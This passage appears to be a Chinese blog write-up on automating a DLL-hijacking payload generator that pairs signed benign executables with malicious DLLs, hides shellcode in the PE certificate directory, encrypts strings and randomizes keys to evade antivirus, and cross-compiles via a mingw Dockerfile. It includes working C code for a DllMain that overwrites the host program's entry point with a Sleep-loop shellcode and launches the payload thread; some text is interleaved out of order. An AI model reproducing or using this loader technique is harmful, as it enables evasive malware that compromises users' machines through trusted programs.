自动化生成器
前面核心的内容跑通了，后面自动化生成就是理所当然的，这方面没什么困难的，就是注意一下加一些
对抗的东西，比如生成的源码里面的字符串全部加密，用于加解密shellcode的key全部随机化生成。将
源码一起打包，并告诉编译方式，这样即使生成的dll被杀了也没关系，自己改改又可以继续了。
一些核心功能：
收集一些白加黑文件，制作成模板
解析白文件pe，将shellcode写入证书目录
根据模板来生成劫持dll
自动调用go命令进行编译
自动打包成zip
里面最麻烦的就是自动编译，因为服务器是linux，而要生成windows的程序，并且在go里面使用了
cgo，不可避免的，要使用交叉编译器了。
找了找资料，用mingw-w64 https://www.mingw-w64.org/downloads/ 可以编译linux编译器，在它下
面有很多linux的二进制直接就能拿来用，但是找了半天没发现centos的，用yum也没发现包。
最后找到了，https://bugzilla.redhat.com/show_bug.cgi?id=1807975 官方将它给移除掉了，但也没说
替代方案。
尝试自己编译，源码download: https://sourceforge.net/projects/mingw-w64/
尝试了下后面就放弃了，编译完估计得占用几个G空间，让本就不充裕的服务器雪上加霜，更重要的是
尝试进行编译的第一步我就失败了，github上有一些可以自动编译的脚本，但看了下源码，它得翻墙下
载一些东西，而服务器上翻墙太麻烦。
最后把目光锁向了docker，github有个项目可以很好的满足我的要求 https://github.com/x1unix/dock
er-go-mingw
用了一下，发现很好用，学习成本也很低，于是开开心心的就去把自动编译集成到docker上。最后测
试，发现还是失败。。
找其原因，是这个项目基于的alpine，只能支持64位的编译。
于是我给官方提了一个issue https://github.com/x1unix/docker-go-mingw/issues/14
官方也很快就回复了我
要编译成32位，需要修改 cc 为32位的编译器。
很快，官方出了一个基于 apline linux/386 的项目，我测试后，发现在mac下仍然存在问题。。
于是在星球上发帖说了下被阻挡在了交叉编译上。。
但是 @李文致 发给我了一个dockerfile完美解决了docker上交叉编译的问题，李文致的版本基于
debian，在它的基础上直接apt装编译器，非常简单有效！
根据它的dockerfile我改了下
FROM golang:1.16
RUN  echo "deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib 
non-free">/etc/apt/sources.list &&\
    echo "deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main 
contrib non-free" >>/etc/apt/sources.list &&\
已经可以解决我的问题。
后续：https://github.com/x1unix/docker-go-mingw 也换成了基于debian的golang镜像，并且也支持
了x86 x64的交叉编译环境。
增强对抗
之前改写入口点死循环，使用了下面死循环的汇编代码
但是发现CPU占用会很大
于是想着加个sleep，但是这样shellcode里就得调用api函数，比较麻烦。
于是想了一招，在dllmain里面获取sleep的地址，写到shellcode的地址上。
具体就是先
再用汇编写个模板，可以将shellcode直接写进去的
    echo "deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main 
contrib non-free" >>/etc/apt/sources.list &&\
    echo "deb https://mirrors.tuna.tsinghua.edu.cn/debian-security/ 
buster/updates main contrib non-free" >>/etc/apt/sources.list &&\
    apt update -y && apt install gcc-mingw-w64-i686 gcc-mingw-w64-x86-64 -y && 
apt autoclean && apt clean
RUN mkdir -p /go/work
ENV PATH=/go/bin:$PATH \
    CGO_ENABLED=1 \
    CC_FOR_TARGET=x86_64-w64-mingw32-gcc \
    CC=x86_64-w64-mingw32-gcc \
    GOOS=windows
WORKDIR /go
77C71B73    50              push eax
77C71B74    58              pop eax
77C71B75  ^ EB FC           jmp short 77C71B73
DWORD sleepFunc = (DWORD)GetProcAddress(LoadLibrary("kernel32.dll"), "Sleep");
/*
    77461B73    68 56341200     push 0x123456
    77461B78    58              pop eax
    77461B79    68 8813000      push 0x1388 ;5s
    77461B7E    FFD0            call eax
    77461B80  ^ EB F1           jmp short ntdll.77461B73
    */
    BYTE shellcode[] = { 
0x68,0x00,0x00,0x00,0x00,0x58,0x68,0x88,0x13,0x00,0x00,0xff,0xd0,0xeb,0xf1};
    int size = sizeof(shellcode) / sizeof(BYTE);
    *(DWORD *)(shellcode+1) = (DWORD)sleepFunc;
最后覆盖的时候使用新的shellcode就行了。
新的dllmain.h
#include 
extern void test();
void dlljack(){
    DWORD baseAddress = (DWORD)GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(baseAddress + 
dosHeader->e_lfanew);
    DWORD entryPoint = (DWORD)baseAddress + ntHeader-
>OptionalHeader.AddressOfEntryPoint;
    DWORD sleepFunc = (DWORD)GetProcAddress(LoadLibrary("kernel32.dll"), 
"Sleep");
    DWORD old;
    /*
    77461B73    68 56341200     push 0x123456
    77461B78    58              pop eax
    77461B79    68 8813000      push 0x1388 ;5s
    77461B7E    FFD0            call eax
    77461B80  ^ EB F1           jmp short ntdll.77461B73
    */
    BYTE shellcode[] = { 
0x68,0x00,0x00,0x00,0x00,0x58,0x68,0x88,0x13,0x00,0x00,0xff,0xd0,0xeb,0xf1};
    int size = sizeof(shellcode) / sizeof(BYTE);
    *(DWORD *)(shellcode+1) = (DWORD)sleepFunc;
    VirtualProtect((LPVOID)entryPoint, size, PAGE_READWRITE, &old);
    for (int i = 0; i < size; i++) {
        *((PBYTE)entryPoint + i) = shellcode[i];
    }
    VirtualProtect((LPVOID)entryPoint, size, old, &old);
    CreateThread(NULL, 0, test, NULL, 0, NULL);
}
BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL,  // handle to DLL module
    DWORD _fdwReason,     // reason for calling function
    LPVOID _lpReserved)   // reserved
{
    switch (_fdwReason) {
    case DLL_PROCESS_ATTACH:
        dlljack();
        break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
测试后运行cpu基本就是0了，非常nice。
    }
    return TRUE; // Successful.
}